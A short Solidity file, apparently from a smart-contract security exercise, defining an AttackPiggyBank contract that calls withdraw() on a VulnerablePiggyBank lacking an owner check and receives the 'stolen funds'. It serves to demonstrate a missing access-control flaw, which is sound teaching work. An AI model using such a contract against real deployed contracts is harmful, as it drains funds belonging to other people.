// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// This contract tries to exploit the vulnerable version 
// where withdraw had no owner check.


import "./VulnerablePiggyBank.sol";

contract AttackPiggyBank {
    VulnerablePiggyBank public target;

    constructor(address _target) {
        target = VulnerablePiggyBank(_target);
    }

    // Attack by calling withdraw on the vulnerable contract
    function attack() public {
        target.withdraw();
    }

    // Receive stolen funds
    receive() external payable {}
}
